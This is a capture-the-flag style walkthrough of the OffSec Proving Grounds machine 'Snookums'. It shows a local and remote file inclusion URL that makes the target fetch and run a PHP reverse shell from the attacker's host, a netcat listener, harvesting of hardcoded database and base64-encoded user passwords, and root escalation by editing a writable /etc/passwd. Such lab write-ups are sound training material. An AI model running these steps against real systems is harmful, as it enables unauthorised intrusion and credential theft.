# 📝 Proving Grounds Practice: Snookums

## 🔍 Target Overview
* **Box Name:** Snookums
* **Platform:** OffSec Proving Grounds (Practice)
* **Target IP:** 192.168.64.58

## 1. Reconnaissance

The engagement began with an `nmap` scan to identify open ports and running services on the target machine.
```bash
nmap -p- -sC -sV 192.168.64.58
```

<img width="400" height="300" alt="image" src="https://github.com/user-attachments/assets/7ecd17bc-0451-4fde-b742-e45a71edcdc6" />

Key Findings:
21/tcp (FTP): vsftpd 3.0.2 (Anonymous login is allowed, but no immediate files of interest were found).
22/tcp (SSH): OpenSSH 7.4.
80/tcp (HTTP): Apache 2.4.6 running PHP 5.4.16.
111/tcp (RPC), 139/445/tcp (SMB), 3306/tcp (MySQL): Additional internal services.

## 2. Web Enumeration
Navigating to http://192.168.64.58 revealed a web application titled "Simple PHP Photo Gallery v0.8".

<img width="600" height="250" alt="image" src="https://github.com/user-attachments/assets/69a2c1c5-75da-447a-94e4-29d4f62d8e47" />

To discover hidden directories, I ran a directory brute-force attack using dirb:
```bash
dirb http://192.168.64.58
```
<img width="250" height="180" alt="image" src="https://github.com/user-attachments/assets/919eea7e-6cc0-4ea7-9153-8fcef969644e" />

This scan revealed standard web directories including /css, /images, /js, and /photos.

<img width="300" height="100" alt="image" src="https://github.com/user-attachments/assets/02d3b9a2-e359-4e0a-b444-1a0cd00cc39e" />

The application returned the contents of /etc/passwd, confirming the LFI vulnerability.

<img width="500" height="180" alt="image" src="https://github.com/user-attachments/assets/21a0f6e9-532b-4ee6-8082-7c2986d5170c" />

<img width="500" height="180" alt="image" src="https://github.com/user-attachments/assets/89e293c4-4cde-4dfb-ae1c-130cd629cf13" />

While searching searchsploit for known vulnerabilities in "PHP Photo Album 0.8", I found a few exploits, but none provided immediate Remote Code Execution (RCE) on this specific build.

<img width="470" height="80" alt="image" src="https://github.com/user-attachments/assets/13f881d8-9093-4490-8fa8-f6b29d1dcf58" />

To escalate the LFI into RCE, I leveraged Remote File Inclusion (RFI). I hosted a standard PHP reverse shell on my local Kali machine and forced the vulnerable parameter to fetch and execute it.

Hosted the payload (php-reverse-shell.php) using Python:
```Bash
python3 -m http.server 80
```
<img width="300" height="50" alt="image" src="https://github.com/user-attachments/assets/2d30c56a-480a-48f7-825c-c026fd1e9ba5" />

Started a Netcat listener to catch the callback:
```Bash
nc -nlvp 445
```

Triggered the payload via the browser:
```Plaintext
[http://192.168.64.58/image.php?img=http://192.168.49.64/php-reverse-shell.php](http://192.168.64.58/image.php?img=http://192.168.49.64/php-reverse-shell.php)
```
<img width="650" height="100" alt="image" src="https://github.com/user-attachments/assets/410f8619-0e01-42c1-9655-e57babb37bae" />

The reverse shell successfully connected back, granting me access as the apache service account.

<img width="450" height="100" alt="image" src="https://github.com/user-attachments/assets/17d7e24e-f14e-4939-a0de-0e9178d31fca" />

## Lateral Movement
Once on the system, I began enumerating the web root (/var/www/html) for sensitive files.
<img width="300" height="180" alt="image" src="https://github.com/user-attachments/assets/8db45ff7-95f3-485a-947a-bf204c6d20c3" />


I searched the PHP files for hardcoded passwords using grep:
```Bash
cat *.php | grep -i pass -C 5
```
<img width="400" height="130" alt="image" src="https://github.com/user-attachments/assets/b0f2d4d3-67c7-46b5-9461-4f75b7e6d14e" />

This revealed database credentials inside db.php:
  - DBUSER: root
  - DBPASS: MalapropDoffUtilize1337

I used these credentials to authenticate to the local MySQL instance:
```Bash
mysql -u root -p
```
<img width="375" height="125" alt="image" src="https://github.com/user-attachments/assets/46cd7653-fb5e-4e5e-b473-0643c6988702" />

Inside MySQL, I found the SimplePHPGal database and queried the users table. This yielded a Base64 encoded string for the user.

<img width="851" height="490" alt="image" src="https://github.com/user-attachments/assets/a84705af-9d78-4788-9cc3-05bf255212fc" />

<img width="380" height="130" alt="image" src="https://github.com/user-attachments/assets/306d5945-066f-499b-867b-5b13aa220a87" />

The string U0c5amExTjVaRzVsZVV0bGNuUnBabmt4TWpNPQ== was double-encoded. Decoding it twice on my local machine revealed the plaintext password:
```Bash
echo U0c5amExTjVaRzVsZVV0bGNuUnBabmt4TWpNPQ== | base64 -d | base64 -d
```
<img width="638" height="124" alt="image" src="https://github.com/user-attachments/assets/52a3c10b-6453-483d-bab0-a88c184cb0a5" />

Decoded Password: HockSydneyCertify123

From my earlier LFI read of /etc/passwd, I knew michael was a valid system user. I used the decoded password to SSH into the machine as michael, successfully bypassing the initial shell restrictions and capturing the user flag (local.txt).

<img width="697" height="258" alt="image" src="https://github.com/user-attachments/assets/ba4a4d4a-acad-4eee-867e-5630b5c350cd" />

## 5. Privilege Escalation
While hunting for privilege escalation vectors, I checked the file permissions within the /etc directory:
```Bash
ls -la /etc
```
<img width="350" height="180" alt="image" src="https://github.com/user-attachments/assets/6f8df109-73a8-4fa6-af0a-9b0b115f02c9" />

I discovered a critical misconfiguration: the user michael had write permissions to the /etc/passwd file (-rw-r--r--. 1 michael root).
To exploit this and gain root access, I opened /etc/passwd using a text editor and modified michael's User ID (UID) and Group ID (GID) from 1000:1000 to 0:0 (the standard identifiers for the root user).

<img width="410" height="225" alt="image" src="https://github.com/user-attachments/assets/4a04430a-260e-4300-85ad-1dde56d54736" />

After saving the file, I simply re-authenticated via SSH as michael. Because the system now recognized michael's UID as 0, I was instantly granted a root shell and was able to retrieve the final flag (proof.txt).

<img width="350" height="200" alt="image" src="https://github.com/user-attachments/assets/35f63875-8459-4901-aa7d-a3e4599d2aa1" />
